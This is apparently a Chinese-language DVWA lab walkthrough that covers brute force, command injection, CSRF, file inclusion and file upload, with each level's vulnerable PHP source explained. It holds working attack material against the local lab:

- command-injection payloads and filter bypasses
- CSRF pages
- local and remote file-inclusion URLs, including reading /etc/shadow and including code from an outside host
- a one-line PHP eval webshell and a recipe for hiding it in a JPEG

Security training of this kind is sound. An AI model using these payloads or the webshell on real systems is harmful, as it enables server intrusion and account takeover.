$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful $html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( 2 ); $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 查看源码即可发现，这段代码里面添加了一个mysqli_real_escape_string()函数，这个函数主要对一些特殊字符作出了过滤，具体查看mysql_real_escape_string() 本函数将 unescaped_string 中的特殊字符转义，并计及连接的当前字符集，因此可以安全用于 mysql_query()。 mysql_real_escape_string() 调用mysql库的函数 mysql_real_escape_string, 在以下字符前添加反斜杠: \\x00, \\n, \\r, , ‘, “ 和 \\x1a. 这个函数能抵挡大部分的SQL注入，但是也有缺陷，可以看看。 虽然无法SQL注入，但还是可以进行爆破，只是有个sleep()函数延时，步骤就像low一样，即可登入。 DVWA Security：high1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful $html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; $html .= &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; high 的代码中又添加了一个函数 stripslashes()，来去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个. 还有mysqli_real_escape_string()函数过滤一些特殊字符，防止SQL注入。 此外，这代码中还添加了token，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。 impossible级别的代码中，加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。 参考文章 Command Injection即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。 DVWA Security：low源码 1234567891011121314151617&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ];// Determine OS and execute the ping command.if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target );&#125;else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target );&#125;// Feedback for the end user$html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 这段代码中，主要是两个函数 stristr(string,search,before_search) stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。 php_uname(mode) 这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。 漏洞利用 window和linux系统都可以用&amp;&amp;来执行多条命令 payload：127.0.0.1&amp;&amp;dir DVWA Security：medium123456789101112131415161718192021222324&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Set blacklist $substitutions = array( &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user $html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; medium级别的代码中，用一个数组替换了**&amp;&amp;和;，但是并没有过滤掉&amp;**，也可以这样写127.0.0.1&amp;;&amp;dir，再或者使用127.0.0.1|dir payload：127.0.0.1&amp;dir或者127.0.0.1&amp;;&amp;dir “&amp;&amp;”和“&amp;”的区别： ping 127.0.0.1&amp;&amp;dir 先执行ping 127.0.0.1，执行成功，再执行dir，否则不执行dir ping 127.0.0.1&amp;dir 无论ping 127.0.0.1是否执行成功，都会执行dir DVWA Security：high12345678910111213141516171819202122232425262728293031&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user $html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; high级别的代码中添加了更严格的过滤，过滤了&amp;、;、| 、-、$、(、)、`、||。 过滤了”| “（后面多个空格），只要没有空格就可以绕过，就不会被滤掉， payload：127.0.0.1|dir DVWA Security：impossible123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&#x27;s put the IP back together. $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user $html .= &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake $html .= &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; stripslashes(string) stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。 explode(separator,string,limit) 把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。 is_numeric(string) 检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。 可以看到，Impossible级别的代码加入了Anti-CSRF token，同时对参数ip进行了严格的限制，只有诸如“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。 如何测试命令注入 总结命令注入漏洞是特别危险的，因为它们允许未经授权的执行操作系统命令， 它们的存在，因为应用程序无法正确地验证和消毒，使用时调用shell的功能，如的参数。 攻击者与控制这些参数可以欺骗应用程序执行任何系统命令自己的选择。例如，UNIX应用程序列出了使用的文件夹的内容。 它需要的字符串FOLDER_NAME，从用户，没有任何验证，连接到“ls”的建立实际的命令。 应用程序，然后通过命令（“LS FOLDER_NAME “）的系统（）函数，并获取结果。 一个命令注入漏洞，允许攻击者注入额外的命 令在输入字符串FOLDER_NAME的， 其结果是被欺骗应用程序执行攻击者的额外的命 令。为了正确测试命令注入漏洞，应遵循以下步骤： 第1步： 了解攻击场景 第2步： 分析原因及对策 第3步： 开始试验和探索 第4步： 微调测试案例 参考文章1 参考文章 CSRF(Cross-site request forgery)CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。 DVWA security:low1234567891011121314151617181920212223&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 尝试更改密码 链接变成了http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change# 那么我们可以构造一个CSRF攻击的链接，用同一个浏览器点击这个链接http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change# 就会改掉密码，变成password 需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Firefox登录的这个系统，而用Chrome点击这个链接，攻击是不会触发的，因为Chrome并不能利用Firefox的cookie，所以会自动跳转到登录界面。 构造攻击页面 现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。在本地写一个test.html，下面是具体代码。 123&lt;img src=&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt; 访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了password 也可以利用bp抓包之后，利用自带的工具CSRF PoC 得到一个脚本文件，复制之后，新建一个.html文件， 123456789101112&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://127.0.0.1/WWW/DVWA/vulnerabilities/csrf/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password&amp;#95;new&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;password&amp;#95;conf&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 使用同一个浏览器打开， 点击submit 成功更改密码。 DVWA security：medium123456789101112131415161718192021222324252627282930&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Checks to see where the request came from if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Didn&#x27;t come from a trusted source $html .= &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; eregi(string pattern, string string) 检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。这个函数可使用url二次编码绕过。 使用eregi()函数检查HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是127.0.0.1），所以referer中必须含有主机地址才行 使用bp抓包后， 可以像上面一样，得到一个脚本文件 保存成.html文件，访问之后，即可更改密码 DVWA security：high123456789101112131415161718192021222324252627&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; high级别的代码中添加了对token的验证，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。 参考文章https://www.freebuf.com/articles/web/118352.html 参考文章https://www.cnblogs.com/xiaoqiyue/p/10144351.html File InclusionFile Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。 low1234&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];?&gt; 代码很少，就一行，没有对参数进行任何的处理，点击下面的三个链接，可以看到url中的变化 尝试读取shadow文件http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=/etc/shadow 可以看到报错信息，可见不是Linux系统，而是Windows系统，同时也可以看到一个绝对路径F:\\phpstudy\\PHPTutorial\\WWW\\DVWA\\vulnerabilities\\fi\\index.php 尝试读取文件http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=F:\\phpstudy\\PHPTutorial\\WWW\\DVWA\\php.ini 上面使用的是绝对路径，也可以使用相对路径，http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=..\\..\\php.ini 能够读取到php.ini配置文件， 远程文件包含 当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态On时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。 假如，一个地址为x.x.x.x的服务器上包含一个phpinfo.txt文件，内容 123&lt;?phpphpinfo();?&gt; 那么就可以通过访问http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=http://x.x.x.x/phpinfo.txt，来执行phpinfo()函数 medium1234567&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot;&quot; ), &quot;&quot;, $file );?&gt; medium的代码中对一些字符进行了过滤，”http://“，”https://“ ，”../“, “..\\“， 这里过滤了..\\，http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=..\\..\\php.ini应该是无法读取文件的，但是这里依然可以读取，有点懵 这里使用绝对路径是完全没问题的 这里过滤了http://和https://，但是str_replace有很大的安全问题，可以使用大小写或者双写绕过这个检测，所以，远程文件包含，http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=htthttp://p://x.x.x.x/phpinfo.txt或者http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=HTtp://x.x.x.x/phpinfo.txt来实现远程文件包含。 high12345678910&lt;?php// The page we wish to display$file = $_GET[ &#x27;page&#x27; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; // This isn&#x27;t the page we want! echo &quot;ERROR: File not found!&quot;; exit;&#125;?&gt; High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。fnmatch 看似安全，但是可以利用file协议来读取文件 http://127.0.0.1/WWW/DVWA/vulnerabilities/fi/?page=file://F:\\phpstudy\\PHPTutorial\\WWW\\DVWA\\php.ini file upload 即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。 low1234567891011121314151617&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No $html .= &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! $html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125;&#125;?&gt; basename() 函数返回路径中的文件名部分。 可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。 所以，直接上传一个php马 123&lt;?php @eval($_POST[&#x27;hack&#x27;]);?&gt; 上传成功并且返回了文件路径， 尝试访问，是一个空白界面，但是确实是有这个界面的。 上菜刀 成功拿到shell medium12345678910111213141516171819202122232425262728293031&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ]; $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123; // No $html .= &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! $html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file $html .= &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; medium代码中要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB） 用burpsuite抓包更改一下文件类型即可。（也可以上传一个shell.jpg，然后抓包修改为shell.php） 在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。 成功上传，再次使用菜刀连接即可。 high12345678910111213141516171819202122232425262728&lt;?phpif( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] ); // File information $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1); $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ]; $uploaded_tmp = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;( $uploaded_size &lt; 100000 ) &amp;&amp;getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No $html .= &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;; &#125; else &#123; // Yes! $html .= &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Invalid file $html .= &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;; &#125;&#125;?&gt; substr() 函数返回字符串的一部分。 strrpos() 函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）。 123&lt;?php //找到“php”第一次出现的位置echo strrpos(&quot;I love php, I love php too!&quot;,&quot;php&quot;);?&gt; strtolower将字符串中所有的字母字符转换为小写并返回。 getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 high的代码相当于一个白名单，只允许上传.jpg、.png、.jpeg后缀文件，文件大小小于100000。 所以，我们需要制作一个图片马，制作方法如下： 首先，找一个正常的图片test.jpg，然后再加上上面那样的php一句话木马，在cmd输入copy test.jpg/b + shell.php/a picshell.jpg 得到的picshell.jpg文件中 可以看到木马已经写进来了，可以上传了。 直接上菜刀的话是不行的，因为这个文件不会被当成php来解析。所以这里要使用文件包含，文件包含有个漏洞，就是它不会识别是不是php文件，只要你使用了文件包含，它都会来当成php来解析，所以图片马就可被解析。 